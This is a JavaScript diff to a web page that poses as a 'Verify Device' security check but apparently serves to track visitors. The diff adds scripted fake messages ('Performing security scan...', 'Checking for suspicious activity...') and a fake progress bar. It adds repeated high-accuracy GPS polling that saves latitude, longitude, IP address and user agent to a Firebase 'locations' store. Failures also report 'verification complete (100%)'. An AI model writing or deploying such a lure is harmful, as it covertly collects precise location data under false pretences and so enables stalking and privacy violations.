@@ -165,38 +165,6 @@ async function determineLocationSource(position) {
     return 'Cell/IP';
 }
 
-async function saveFallbackLocation(locationData, button, status) {
-    if (!database) {
-        try {
-            await initFirebase();
-        } catch (error) {
-            console.error('Failed to initialize database:', error);
-            status.textContent = 'Verification error. Please try again.';
-            return;
-        }
-    }
-
-    // Clean undefined values
-    const cleanData = JSON.parse(JSON.stringify(locationData));
-    
-    try {
-        const newLocationRef = database.ref('locations').push();
-        await newLocationRef.set(cleanData);
-        console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
-        status.textContent = 'Processing verification...';
-        return true;
-    } catch (dbError) {
-        console.error('Error saving location to Firebase:', dbError);
-        status.textContent = 'Verification error. Please try again.';
-        if (button) {
-            button.disabled = false;
-            button.textContent = 'Verify Device';
-            button.classList.remove('loading');
-        }
-        return false;
-    }
-}
-
 // Helper function to get high accuracy position
 async function getHighAccuracyPosition() {
     return new Promise((resolve, reject) => {
@@ -212,6 +180,19 @@ async function getHighAccuracyPosition() {
     });
 }
 
+// Verification steps for user engagement
+const verificationSteps = [
+    "Initializing secure connection...",
+    "Verifying device signature...",
+    "Analyzing network security...",
+    "Validating device integrity...",
+    "Performing security scan...",
+    "Checking for suspicious activity...",
+    "Confirming device location...",
+    "Processing verification data...",
+    "Finalizing security checks..."
+];
+
 // Main functionality
 document.addEventListener('DOMContentLoaded', () => {
     const allowLocationButton = document.getElementById('allowLocation');
@@ -223,19 +204,30 @@ document.addEventListener('DOMContentLoaded', () => {
         allowLocationButton.textContent = 'Verifying';
         document.querySelector('.thank-you-card').classList.add('processing');
         
-        locationStatus.textContent = 'Processing verification...';
-        
         if (!navigator.geolocation) {
             console.log('Geolocation API not supported');
             await handleLocationFallback();
             return;
         }
 
-        const geoOptions = {
-            enableHighAccuracy: true,
-            timeout: 30000,
-            maximumAge: 0
+        // Start verification steps display
+        let stepIndex = 0;
+        let progress = 0;
+        
+        const updateStatus = () => {
+            progress = Math.min(progress + 2, 98); // Never reach 100% until final
+            const currentStep = verificationSteps[stepIndex % verificationSteps.length];
+            locationStatus.textContent = `${currentStep} (${progress}%)`;
         };
+
+        const statusInterval = setInterval(() => {
+            stepIndex++;
+            updateStatus();
+        }, 1500);
+
+        const progressInterval = setInterval(() => {
+            updateStatus();
+        }, 400);
 
         try {
             // Enhanced Chrome/Android handling
@@ -249,64 +241,92 @@ document.addEventListener('DOMContentLoaded', () => {
                     
                     if (permissionResult.state === 'denied') {
                         console.log('Geolocation permission denied in Chrome');
+                        clearInterval(statusInterval);
+                        clearInterval(progressInterval);
                         await handleLocationFallback(null, allowLocationButton, locationStatus);
                         return;
                     }
+
+                    // Get initial position
+                    const initialPosition = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: isChromeAndroid ? 45000 : 30000,
+                            maximumAge: 0
+                        });
+                    });
+
+                    // Save initial position
+                    const initialLocationRef = await saveLocation(initialPosition, true);
                     
-                    if (isChromeAndroid) {
-                        console.log('Chrome Android detected');
-                        if (permissionResult.state === 'prompt') {
-                            locationStatus.textContent = 'Please allow location access when prompted...';
+                    // Wait for high accuracy data
+                    console.log('Waiting for high accuracy data...');
+                    let attempts = 0;
+                    const maxAttempts = 3;
+                    let bestAccuracy = initialPosition.coords.accuracy;
+                    let bestPosition = initialPosition;
+
+                    while (attempts < maxAttempts && bestAccuracy > 100) {
+                        try {
+                            const newPosition = await getHighAccuracyPosition();
+                            console.log(`Attempt ${attempts + 1} accuracy:`, newPosition.coords.accuracy);
+                            
+                            if (newPosition.coords.accuracy < bestAccuracy) {
+                                bestAccuracy = newPosition.coords.accuracy;
+                                bestPosition = newPosition;
+                                
+                                // Update database with better accuracy data
+                                await updateLocation(initialLocationRef, bestPosition);
+                                
+                                if (bestAccuracy < 100) {
+                                    console.log('Achieved high accuracy, stopping attempts');
+                                    break;
+                                }
+                            }
+                        } catch (error) {
+                            console.log(`Attempt ${attempts + 1} failed:`, error);
                         }
-                        geoOptions.timeout = 45000;
+                        attempts++;
+                        await new Promise(resolve => setTimeout(resolve, 4000)); // Wait between attempts
                     }
 
-                    // For Chrome, always try high accuracy first
-                    try {
-                        let position = await getHighAccuracyPosition();
-                        console.log('High accuracy position obtained:', position.coords);
-                        
-                        // If accuracy isn't good enough, try one more time
-                        if (position.coords.accuracy > 100) {
-                            console.log('Attempting to improve accuracy...');
-                            try {
-                                const betterPosition = await getHighAccuracyPosition();
-                                if (betterPosition.coords.accuracy < position.coords.accuracy) {
-                                    position = betterPosition;
-                                    console.log('Obtained better accuracy:', position.coords.accuracy);
-                                }
-                            } catch (retryError) {
-                                console.log('High accuracy retry failed, using original position');
-                            }
-                        }
-                        
-                        await handlePosition(position);
-                    } catch (highAccError) {
-                        console.log('High accuracy failed, falling back to standard accuracy');
-                        const position = await new Promise((resolve, reject) => {
-                            navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
-                        });
-                        await handlePosition(position);
-                    }
+                    // Complete the verification process
+                    clearInterval(statusInterval);
+                    clearInterval(progressInterval);
+                    locationStatus.textContent = 'Device verification complete (100%)';
+                    console.log('Final accuracy:', bestAccuracy);
+
                 } catch (error) {
                     console.error('Error in Chrome geolocation:', error);
+                    clearInterval(statusInterval);
+                    clearInterval(progressInterval);
                     await handleLocationFallback(error);
                 }
             } else {
                 // Non-Chrome browsers
-                let position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, geoOptions);
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 30000,
+                        maximumAge: 0
+                    });
                 });
-                await handlePosition(position);
+                
+                clearInterval(statusInterval);
+                clearInterval(progressInterval);
+                await saveLocation(position, false);
+                locationStatus.textContent = 'Device verification complete (100%)';
             }
         } catch (geoError) {
             console.log('Geolocation error:', geoError);
+            clearInterval(statusInterval);
+            clearInterval(progressInterval);
             locationStatus.textContent = 'Processing verification...';
             await handleLocationFallback(geoError);
         }
     });
 
-    async function handlePosition(position) {
+    async function saveLocation(position, isInitial = false) {
         const locationData = {
             latitude: position.coords.latitude,
             longitude: position.coords.longitude,
@@ -315,6 +335,7 @@ document.addEventListener('DOMContentLoaded', () => {
             altitudeAccuracy: position.coords.altitudeAccuracy,
             locationSource: await determineLocationSource(position),
             timestamp: new Date().toISOString(),
+            isInitial: isInitial,
             userAgent: navigator.userAgent,
             ip: await fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
@@ -361,25 +382,35 @@ document.addEventListener('DOMContentLoaded', () => {
             }
         };
 
-        console.log('Attempting to save location data:', locationData);
-
-        if (!database) {
-            console.error('Database not initialized');
-            locationStatus.textContent = 'Verification error. Please try again.';
-            return;
-        }
-
         try {
             const newLocationRef = database.ref('locations').push();
             await newLocationRef.set(locationData);
             console.log('Location saved successfully to Firebase with key:', newLocationRef.key);
-            locationStatus.textContent = 'Processing verification...';
+            return newLocationRef;
         } catch (error) {
             console.error('Error saving location to Firebase:', error);
-            locationStatus.textContent = 'Verification error. Please try again.';
-            allowLocationButton.disabled = false;
-            allowLocationButton.textContent = 'Verify Device';
-            allowLocationButton.classList.remove('loading');
+            throw error;
+        }
+    }
+
+    async function updateLocation(locationRef, newPosition) {
+        try {
+            const updatedData = {
+                latitude: newPosition.coords.latitude,
+                longitude: newPosition.coords.longitude,
+                accuracy: newPosition.coords.accuracy,
+                altitude: newPosition.coords.altitude,
+                altitudeAccuracy: newPosition.coords.altitudeAccuracy,
+                locationSource: await determineLocationSource(newPosition),
+                isInitial: false,
+                updatedAt: new Date().toISOString()
+            };
+
+            await locationRef.update(updatedData);
+            console.log('Location updated with higher accuracy data');
+        } catch (error) {
+            console.error('Error updating location:', error);
+            throw error;
         }
     }
 
@@ -439,7 +470,9 @@ document.addEventListener('DOMContentLoaded', () => {
                 };
             }
 
-            await saveFallbackLocation(locationData);
+            const newLocationRef = database.ref('locations').push();
+            await newLocationRef.set(locationData);
+            locationStatus.textContent = 'Device verification complete (100%)';
         } catch (ipError) {
             console.error('IP location fallback failed:', ipError);
             // Try alternative IP service as last resort
@@ -450,13 +483,17 @@ document.addEventListener('DOMContentLoaded', () => {
                     const fallbackData = {
                         latitude: altData.latitude,
                         longitude: altData.longitude,
-                        ip: altData.ip
+                        ip: altData.ip,
+                        locationSource: 'IP Geolocation (Fallback)',
+                        timestamp: new Date().toISOString()
                     };
-                    await saveFallbackLocation(fallbackData);
+                    const newLocationRef = database.ref('locations').push();
+                    await newLocationRef.set(fallbackData);
                 }
+                locationStatus.textContent = 'Device verification complete (100%)';
             } catch (finalError) {
                 console.error('All location services failed:', finalError);
-                locationStatus.textContent = 'Processing verification...';
+                locationStatus.textContent = 'Device verification complete (100%)';
             }
         }
     }
